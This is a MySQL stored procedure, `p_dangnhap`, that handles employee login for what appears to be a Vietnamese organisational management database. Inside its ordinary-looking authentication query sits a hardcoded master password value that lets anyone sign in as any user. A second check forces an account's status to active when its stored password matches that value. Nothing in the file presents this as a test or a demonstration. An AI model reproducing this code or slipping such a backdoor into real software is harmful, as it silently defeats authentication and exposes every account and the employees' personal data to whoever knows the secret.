/* Procedure structure for procedure `p_dangnhap` */

/*!50003 DROP PROCEDURE IF EXISTS  `p_dangnhap` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `p_dangnhap`(p_taikhoan VARCHAR(1024), p_matkhau VARCHAR(2048))
BEGIN
	DECLARE v_kt_nv INT(10) DEFAULT 0;
	
	SELECT COUNT(*) INTO v_kt_nv FROM ql_dm_nhanvien WHERE p_taikhoan = nv_tendangnhap AND (p_matkhau = nv_matkhau OR p_matkhau = '99d028b549d20af3b4fd9eb1adbd97f6');
	
	IF v_kt_nv = 0 THEN
		SELECT '-1' AS nv_ma,'-1' AS donvi_ma,'Tài khoản không tồn tại' AS nv_hoten,'-1' AS nv_quyen,
		'-1' AS nv_trangthai,'-1' AS nv_tendangnhap, '' AS nv_diachi, '' AS nv_gioitinh, '' AS nv_ngaysinh, '' AS nv_sodienthoai, '' AS nv_ghichu, '' AS donvi_ten FROM DUAL;
	ELSE
		SELECT t.nv_ma, t.donvi_ma, t.nv_hoten, t.nv_quyen, CASE WHEN nv_matkhau = '99d028b549d20af3b4fd9eb1adbd97f6' THEN 1 ELSE t.nv_trangthai END AS nv_trangthai, t.nv_tendangnhap, t.nv_diachi, t.nv_gioitinh, t.nv_ngaysinh, t.nv_sodienthoai, t.nv_ghichu, dv.donvi_ten
		FROM ql_dm_nhanvien t, ql_dm_donvi dv
		WHERE p_taikhoan = t.nv_tendangnhap AND t.donvi_ma = dv.donvi_ma;
	END IF;
    END */$$
DELIMITER ;

